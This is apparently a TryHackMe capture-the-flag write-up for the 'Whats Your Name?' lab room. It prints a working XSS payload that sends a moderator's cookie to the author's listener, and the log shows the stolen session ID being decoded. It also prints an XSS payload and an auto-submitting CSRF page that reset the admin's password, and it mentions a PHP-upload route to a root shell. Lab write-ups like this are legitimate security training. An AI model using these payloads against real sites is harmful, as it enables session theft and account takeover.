---
title: 'TryHackMe: Whats Your Name?'
author: jaxafed
categories: [TryHackMe]
tags: [web, js, xss, csrf]
render_with_liquid: false
media_subpath: /images/tryhackme_whats_your_name/
image:
  path: room_image.webp
---

Whats Your Name was a room about client-side exploitation, in which we first use an XSS vulnerability in the user registration to steal the cookie of the moderator user and gain access to a chat application. In this chat application, we can use either XSS or CSRF vulnerabilities to change the password for the admin user and gain admin access.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/whatsyourname){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.100.74
Nmap scan report for 10.10.100.74
Host is up (0.100s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 41:e9:13:4f:bf:33:f8:2c:b1:4e:ad:e8:23:99:4a:90 (RSA)
|   256 74:03:18:83:e1:44:93:50:6d:7a:95:29:e7:99:9c:ee (ECDSA)
|_  256 28:58:50:eb:e8:07:ce:0d:53:4b:a4:38:0b:94:70:d9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8081/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Adding `worldwap.thm` to our hosts per the room instructions.

```
10.10.100.74 worldwap.thm
```
{: file="/etc/hosts" }

### worldwap.thm

Visiting `http://worldwap.thm/`, we get redirected to `http://worldwap.thm/public/html/`.

![Web Server Worldwap Index](worldwap_index.webp){: width="1200" height="900" }

Checking out the registration functionality, we see a message informing us that our registration details will be viewed by the site moderator.

![Web Server Worldwap Register](worldwap_register.webp){: width="1200" height="900" }

After registering an account, we get redirected to `http://worldwap.thm/public/html/login.php`, where we can login.

![Web Server Worldwap Login](worldwap_login.webp){: width="1200" height="900" }

We also discover a subdomain: `login.worldwap.thm`

Adding it to our hosts file.

```
10.10.100.74 worldwap.thm login.worldwap.thm
```
{: file="/etc/hosts" }

### login.worldwap.thm

Visiting `http://login.worldwap.thm/`, we get an empty page.

![Web Server Login Worldwap Index](login_worldwap_index.webp){: width="1200" height="900" }

Checking the source code for the page, we discover the `login.php` endpoint.

![Web Server Login Worldwap Index Sourcecode](login_worldwap_index_sourcecode.webp){: width="800" height="300" }

At `http://login.worldwap.thm/login.php`, we get a login page.

![Web Server Login Worldwap Login](login_worldwap_login.webp){: width="1200" height="900" }

## Moderator Flag

At `http://worldwap.thm/`, upon following the redirect to `http://worldwap.thm/public/html/`, we see the site setting a cookie.

Interesting things to note is; `HttpOnly` attribute is missing from the cookie and `domain=.worldwap.thm` attribute that makes the same cookie being used for any subdomains, like `login.worldwap.thm` in our case.

Since we know our registration form will be reviewed by the moderator, we can try XSS payloads on registration, and due to the `HttpOnly` attribute being missing on the cookies, if we find an XSS vulnerability, we can use it to steal the cookies for the moderator.

Trying a simple XSS payload like `<script>fetch('http://10.11.72.22/');</script>` on the `Name` field while registering, we get a hit on our webserver confirming XSS.

![Web Server Worldwap Register XSS Test](worldwap_register_xsstest.webp){: width="1200" height="900" }

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.100.74 - - [26/Apr/2024 23:54:00] "GET / HTTP/1.1" 200 -
```

We can use a payload like this to steal the cookies of the moderator: `<script>fetch('http://10.11.72.22/?'+btoa(document.cookie));</script>`

![Web Server Worldwap Register XSS Payload](worldwap_register_xsspayload.webp){: width="1200" height="900" }

After some time, we get the cookie in a request to our webserver.

```console
10.10.100.74 - - [26/Apr/2024 23:58:00] "GET /?UEhQU0VTU0lEPTFzMGo5YXZiOTlzZm9mcnNkbmY5Nm9oMGI0 HTTP/1.1" 200 -

$ echo UEhQU0VTU0lEPTFzMGo5YXZiOTlzZm9mcnNkbmY5Nm9oMGI0 | base64 -d
PHPSESSID=1s0j9avb99sfofrsdnf96oh0b4
```

After changing our cookie to the moderator's cookie and visiting `http://worldwap.thm/public/html/` we get redirected to `http://worldwap.thm/public/html/dashboard.php`.

![Web Server Worldwap Dashboard](worldwap_dashboard.webp){: width="1200" height="900" }

Remembering the cookie is also set for any subdomain, we visit `http://login.worldwap.thm/login.php` and get redirected to `http://login.worldwap.thm/profile.php`, where we get the moderator flag.

![Web Server Login Worldwap Moderator Flag](login_worldwap_moderator_flag.webp){: width="1200" height="900" }

## Admin Flag

After gaining access to `http://login.worldwap.thm/`, there are two main endpoints.

At `http://login.worldwap.thm/change_password.php`, admin users are able to change passwords.

![Web Server Login Worldwap Change Password](login_worldwap_change_password.webp){: width="1200" height="900" }

The request made for password change is a POST request to `http://login.worldwap.thm/change_password.php` endpoint with `application/x-www-form-urlencoded` content type and only requires the new password.

![Web Server Login Worldwap Change Password Request](login_worldwap_change_password_request.webp){: width="500" height="500" }

At `http://login.worldwap.thm/chat.php`, we are able to send messages to the admin user.

![Web Server Login Worldwap Chat](login_worldwap_chat.webp){: width="1200" height="900" }

> At this point, there are two ways to move forward; I will show both.
{: .prompt-info }

### XSS

Testing a simple XSS payload like `<script>alert(1)</script>` on the chat, we see that it works.

![Web Server Login Worldwap Chat XSS](login_worldwap_chat_xss.webp){: width="1200" height="900" }

Since the password change only requires the new password, we can use this XSS to force the admin to make a password change request.

For this, we can use a payload like this:

```html
<script>fetch('/change_password.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:"new_password=password"});</script>
```
{: .wrap }

After sending our payload as a message on the chat and the admin visiting the chat, we are able to login as the admin user with the new password.

![Web Server Login Worldwap Admin Login](login_worldwap_admin_login.webp){: width="1200" height="900" }

After logging in, we get redirected to `http://login.worldwap.thm/profile.php`, where we get the admin flag.

![Web Server Login Worldwap Admin Flag](login_worldwap_admin_flag.webp){: width="1200" height="900" }

### CSRF

If we send a link to the admin in the chat, we see the admin user clicking it.

![Web Server Login Worldwap Chat Link](login_worldwap_chat_link.webp){: width="1200" height="900" }

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.100.74 - - [27/Apr/2024 00:35:57] code 404, message File not found
10.10.100.74 - - [27/Apr/2024 00:35:57] "GET /test HTTP/1.1" 404 -
```

Since the password change request is a [simple request](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests), this causes a CSRF vulnerability where we can make the admin visit a malicious page we control that will automatically submit a form to the password change endpoint, and since this will be a simple request, cookies will be included.

Using Python to host our malicious page:

```html
<!DOCTYPE html>
<html>
<head>
	<title>CSRF</title>
</head>
<body>
<form id="autosubmit" action="http://login.worldwap.thm/change_password.php" enctype="application/x-www-form-urlencoded" method="POST">
 <input name="new_password" type="hidden" value="password" />
</form>
<script>
 document.getElementById("autosubmit").submit();
</script>
</body>
</html>
```
{: file="change_pass.html" .wrap }

Sending the link to our page to admin.

![Web Server Login Worldwap Chat CSRF Payload](login_worldwap_chat_csrf.webp){: width="1200" height="900" }

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.100.74 - - [27/Apr/2024 00:44:33] "GET /change_pass.html HTTP/1.1" 200 -
```

When the admin visits our page, a password change request will be made.

Now, once again, we are able to login with the new credentials and get the admin flag.

## End Note

> If you want to have a look around to see how things work, it is possible to get a shell as root on the machine by uploading a PHP file using the `http://worldwap.thm/api/upload.php` endpoint and using `sudo` to escalate privileges.
{: .prompt-tip }



<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>